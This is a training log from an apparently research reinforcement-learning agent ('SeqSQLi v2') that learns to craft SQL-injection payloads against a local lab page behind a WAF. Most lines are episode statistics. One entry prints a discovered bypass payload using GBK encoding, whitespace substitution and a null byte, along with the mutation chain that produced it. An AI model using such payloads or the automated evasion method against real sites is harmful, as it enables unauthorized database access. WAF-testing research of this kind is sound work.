/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.82
  Ep   20 | SR=0% | Steps=15.0 | R=-45.63
  Ep   30 | SR=0% | Steps=15.0 | R=-44.75
  Ep   40 | SR=0% | Steps=15.0 | R=-47.45
  Ep   50 | SR=0% | Steps=15.0 | R=-45.65
  Ep   60 | SR=0% | Steps=15.0 | R=-45.29
  Ep   70 | SR=0% | Steps=15.0 | R=-47.39
  Ep   80 | SR=0% | Steps=15.0 | R=-45.51
  Ep   90 | SR=0% | Steps=15.0 | R=-46.37
  Ep  100 | SR=0% | Steps=15.0 | R=-46.18
  Ep  110 | SR=0% | Steps=15.0 | R=-45.72
  Ep  120 | SR=0% | Steps=15.0 | R=-46.24
  Ep  130 | SR=0% | Steps=15.0 | R=-45.63
  Ep  140 | SR=0% | Steps=15.0 | R=-45.79
  Ep  150 | SR=0% | Steps=15.0 | R=-46.28
  Ep  160 | SR=0% | Steps=15.0 | R=-44.52
  Ep  170 | SR=0% | Steps=15.0 | R=-45.05
  Ep  180 | SR=0% | Steps=15.0 | R=-45.31
  Ep  190 | SR=0% | Steps=15.0 | R=-47.69
  Ep  200 | SR=0% | Steps=15.0 | R=-45.71
  Ep  210 | SR=0% | Steps=15.0 | R=-45.71
  Ep  220 | SR=0% | Steps=15.0 | R=-46.29
  Ep  230 | SR=0% | Steps=15.0 | R=-46.71
  Ep  240 | SR=0% | Steps=15.0 | R=-46.01
  Ep  250 | SR=0% | Steps=15.0 | R=-47.21
  Ep  260 | SR=0% | Steps=15.0 | R=-47.31
  Ep  270 | SR=0% | Steps=15.0 | R=-44.84
  Ep  280 | SR=0% | Steps=15.0 | R=-46.11
  Ep  290 | SR=0% | Steps=15.0 | R=-46.00
  Ep  300 | SR=0% | Steps=15.0 | R=-44.73
  Ep  310 | SR=0% | Steps=15.0 | R=-44.73
  Ep  320 | SR=0% | Steps=15.0 | R=-45.14
  Ep  330 | SR=0% | Steps=15.0 | R=-45.50
  Ep  340 | SR=0% | Steps=15.0 | R=-45.10
  Ep  350 | SR=0% | Steps=15.0 | R=-45.42
  Ep  360 | SR=0% | Steps=15.0 | R=-45.73
  Ep  370 | SR=0% | Steps=15.0 | R=-46.11
  Ep  380 | SR=0% | Steps=15.0 | R=-45.13
  Ep  390 | SR=0% | Steps=15.0 | R=-45.10
  Ep  400 | SR=0% | Steps=15.0 | R=-46.01
  Ep  410 | SR=0% | Steps=15.0 | R=-44.95
  Ep  420 | SR=0% | Steps=15.0 | R=-46.59
  Ep  430 | SR=0% | Steps=15.0 | R=-45.39
  Ep  440 | SR=0% | Steps=15.0 | R=-44.52
  Ep  450 | SR=0% | Steps=15.0 | R=-45.52
  Ep  460 | SR=0% | Steps=15.0 | R=-45.13
  Ep  470 | SR=0% | Steps=15.0 | R=-44.44
  Ep  480 | SR=0% | Steps=15.0 | R=-44.47
  Ep  490 | SR=0% | Steps=15.0 | R=-45.45
  Ep  500 | SR=0% | Steps=15.0 | R=-44.80
  Ep  510 | SR=0% | Steps=15.0 | R=-45.32
  Ep  520 | SR=0% | Steps=15.0 | R=-46.80
  Ep  530 | SR=0% | Steps=15.0 | R=-45.71
  Ep  540 | SR=0% | Steps=15.0 | R=-45.15
  Ep  550 | SR=0% | Steps=15.0 | R=-46.07
  [BYPASS] Ep  559 | steps=11 | seq=gbk_bypass -> concat_char -> unhex_wrap -> url_mid_char -> tab_space -> nested_union -> null_byte -> gbk_bypass -> case -> keyword_split -> func_sp_nbsp
           payload: 1%bf%27%09aND%09GTID_SUBSET((version%a0()),1);%00  *** NEW SHORTEST ***
  Ep  560 | SR=10% | Steps=14.6 | R=-41.56
  Ep  570 | SR=0% | Steps=15.0 | R=-44.43
  Ep  580 | SR=0% | Steps=15.0 | R=-44.94
  Ep  590 | SR=0% | Steps=15.0 | R=-45.61
  Ep  600 | SR=0% | Steps=15.0 | R=-46.11
  Ep  610 | SR=0% | Steps=15.0 | R=-45.35
  Ep  620 | SR=0% | Steps=15.0 | R=-45.26
  Ep  630 | SR=0% | Steps=15.0 | R=-44.78
  Ep  640 | SR=0% | Steps=15.0 | R=-45.03
  Ep  650 | SR=0% | Steps=15.0 | R=-44.48
  Ep  660 | SR=0% | Steps=15.0 | R=-44.55
  Ep  670 | SR=0% | Steps=15.0 | R=-45.55
  Ep  680 | SR=0% | Steps=15.0 | R=-45.96
  Ep  690 | SR=0% | Steps=15.0 | R=-44.65
  Ep  700 | SR=0% | Steps=15.0 | R=-45.54
  Ep  710 | SR=0% | Steps=15.0 | R=-44.46
  Ep  720 | SR=0% | Steps=15.0 | R=-44.97
  Ep  730 | SR=0% | Steps=15.0 | R=-44.99
  Ep  740 | SR=0% | Steps=15.0 | R=-45.05
  Ep  750 | SR=0% | Steps=15.0 | R=-43.87
  Ep  760 | SR=0% | Steps=15.0 | R=-46.22
  Ep  770 | SR=0% | Steps=15.0 | R=-45.92
  Ep  780 | SR=0% | Steps=15.0 | R=-44.31
  Ep  790 | SR=0% | Steps=15.0 | R=-44.29
  Ep  800 | SR=0% | Steps=15.0 | R=-44.73
  Ep  810 | SR=0% | Steps=15.0 | R=-44.67
  Ep  820 | SR=0% | Steps=15.0 | R=-45.31
  Ep  830 | SR=0% | Steps=15.0 | R=-43.97
  Ep  840 | SR=0% | Steps=15.0 | R=-44.48
  Ep  850 | SR=0% | Steps=15.0 | R=-44.46
  Ep  860 | SR=0% | Steps=15.0 | R=-44.55
  Ep  870 | SR=0% | Steps=15.0 | R=-44.60
  Ep  880 | SR=0% | Steps=15.0 | R=-44.49
  Ep  890 | SR=0% | Steps=15.0 | R=-44.66
  Ep  900 | SR=0% | Steps=15.0 | R=-44.20
  Ep  910 | SR=0% | Steps=15.0 | R=-45.46
  Ep  920 | SR=0% | Steps=15.0 | R=-42.94
  Ep  930 | SR=0% | Steps=15.0 | R=-44.10
  Ep  940 | SR=0% | Steps=15.0 | R=-43.35
  Ep  950 | SR=0% | Steps=15.0 | R=-45.58
  Ep  960 | SR=0% | Steps=15.0 | R=-45.07
  Ep  970 | SR=0% | Steps=15.0 | R=-44.17
  Ep  980 | SR=0% | Steps=15.0 | R=-43.82
  Ep  990 | SR=0% | Steps=15.0 | R=-44.34
  Ep 1000 | SR=0% | Steps=15.0 | R=-44.76
  Ep 1010 | SR=0% | Steps=15.0 | R=-44.89
  Ep 1020 | SR=0% | Steps=15.0 | R=-45.84
  Ep 1030 | SR=0% | Steps=15.0 | R=-44.18
  Ep 1040 | SR=0% | Steps=15.0 | R=-44.91
  Ep 1050 | SR=0% | Steps=15.0 | R=-43.91
  Ep 1060 | SR=0% | Steps=15.0 | R=-43.51
  Ep 1070 | SR=0% | Steps=15.0 | R=-44.09
  Ep 1080 | SR=0% | Steps=15.0 | R=-44.68
  Ep 1090 | SR=0% | Steps=15.0 | R=-42.67
  Ep 1100 | SR=0% | Steps=15.0 | R=-44.52
  Ep 1110 | SR=0% | Steps=15.0 | R=-44.93
  Ep 1120 | SR=0% | Steps=15.0 | R=-43.99
  Ep 1130 | SR=0% | Steps=15.0 | R=-42.92
  Ep 1140 | SR=0% | Steps=15.0 | R=-44.95
  Ep 1150 | SR=0% | Steps=15.0 | R=-45.07
  Ep 1160 | SR=0% | Steps=15.0 | R=-44.40
  Ep 1170 | SR=0% | Steps=15.0 | R=-43.92
  Ep 1180 | SR=0% | Steps=15.0 | R=-44.01
  Ep 1190 | SR=0% | Steps=15.0 | R=-44.49
  Ep 1200 | SR=0% | Steps=15.0 | R=-43.59
  Ep 1210 | SR=0% | Steps=15.0 | R=-43.73
